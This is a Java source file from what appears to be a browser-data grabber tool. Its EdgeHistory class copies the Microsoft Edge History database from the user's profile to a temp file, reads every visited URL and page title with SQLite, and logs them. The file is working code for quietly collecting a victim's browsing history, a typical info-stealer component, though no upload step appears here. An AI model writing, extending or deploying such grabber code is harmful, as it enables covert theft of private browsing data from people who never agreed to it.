package ninja.maki.grabber.edge;

import ninja.maki.utils.Logger;
import ninja.maki.utils.SystemUtil;

import java.io.File;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;

public class EdgeHistory {
    public static void grab() {
        Logger.log("Edge History", Logger.Type.INFO);
        String historyTemp = System.getProperty("java.io.tmpdir") + "edgehistory.tmp";
        String historyPath = System.getProperty("user.home") + "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History";
        File historyTempFile = new File(historyTemp);
        try {
            historyTempFile = File.createTempFile("edgehistory", ".tmp");
            historyTemp = historyTempFile.getAbsolutePath();
        }catch (IOException e){
            Logger.log("Failed to create temp file.", Logger.Type.ERROR);
        }
        File historyPathFile = new File(historyPath);
        if(historyPathFile.exists()) {
            try {
                try {
                    SystemUtil.copyFile(historyPathFile, historyTempFile);
                    Logger.log("Copy \"" + historyPath + "\" to \"" + historyTemp + "\".", Logger.Type.INFO);
                } catch (IOException e) {
                    Logger.log("Failed to copy \"" + historyPath + "\" to \"" + historyTemp + "\".", Logger.Type.ERROR);
                }
                Connection connection;
                Statement statement;
                try {
                    Class.forName("org.sqlite.JDBC");
                    connection = DriverManager.getConnection("jdbc:sqlite:" + historyTemp);
                    connection.setAutoCommit(false);
                    Logger.log("Connect database \"" + historyTemp + "\".", Logger.Type.INFO);
                    statement = connection.createStatement();
                    ResultSet resultSet = statement.executeQuery("SELECT url,title from urls");
                    Logger.log("", Logger.Type.INFO);
                    Logger.log("==================================================================", Logger.Type.INFO);
                    while (resultSet.next()) {
                        String url = resultSet.getString("url");
                        String title = resultSet.getString("title");
                        Logger.log("", Logger.Type.INFO);
                        Logger.log("URL -> " + url, Logger.Type.INFO);
                        Logger.log("Title -> " + title, Logger.Type.INFO);
                    }
                    Logger.log("", Logger.Type.INFO);
                    Logger.log("==================================================================", Logger.Type.INFO);
                    resultSet.close();
                    statement.close();
                    connection.close();
                } catch (Exception e) {
                    Logger.log("Failed to get info.", Logger.Type.ERROR);
                }
            }catch (Exception e) {
                Logger.log(e.getMessage(), Logger.Type.ERROR);
            }
        }else {
            Logger.log("\"" + historyPath + "\" is not founded.", Logger.Type.ERROR);
        }
        Logger.log("", Logger.Type.INFO);
        if(historyTempFile.exists()) {
            if(!historyTempFile.delete()) {
                Logger.log("Failed to delete \"" + historyTemp + "\".", Logger.Type.ERROR);
            }
        }
    }
}
